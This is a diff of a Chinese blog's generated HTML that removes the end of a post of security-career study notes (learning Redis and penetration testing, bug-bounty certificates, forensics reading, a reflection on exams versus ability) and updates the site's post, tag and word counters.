-<li><strong>redis–&gt;渗透测试 搞清楚，一步一步来</strong></li>
-<li>去拿到各种SRC的证书。</li>
-<li>知识积累，突变（量变转质变）web后期一定会是二进制.–横向贯彻(各个方向都要)</li>
-<li>未接触领域,善于找标签:岗位体系–&gt;需要什么知识体系–&gt;将自己的标签和他对应上。标签需要很详细到某方面,类似于安全设备配置这样,而不是安全配置.</li>
-<li>每天一篇：电子取证领域的论文</li>
-</ol>
-<h3 id="为何高分低能？"><a href="#为何高分低能？" class="headerlink" title="为何高分低能？"></a>为何高分低能？</h3><p>考试是采样,高分低能就是这样.采样是点,然而交流或者应用是连续.采样题是无聊的,宽泛的,面试其实也是,都是连续交流,其实开卷反而更难.</p>
-<p>参考：</p>
-<p>认证业务平台:<a target="_blank" rel="noopener" href="http://cstc.cncstea.cn/">http://cstc.cncstea.cn</a></p>
-<p><a target="_blank" rel="noopener" href="http://examanage.cncstea.cn/">http://examanage.cncstea.cn</a></p>
-<p>​    </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1710,7 +1667,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1719,7 +1676,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-count">52</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -1767,12 +1724,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">74k</span>
+    <span title="站点总字数">77k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:07</span>
+    <span title="站点阅读时长">1:10</span>
 </div>
 
         
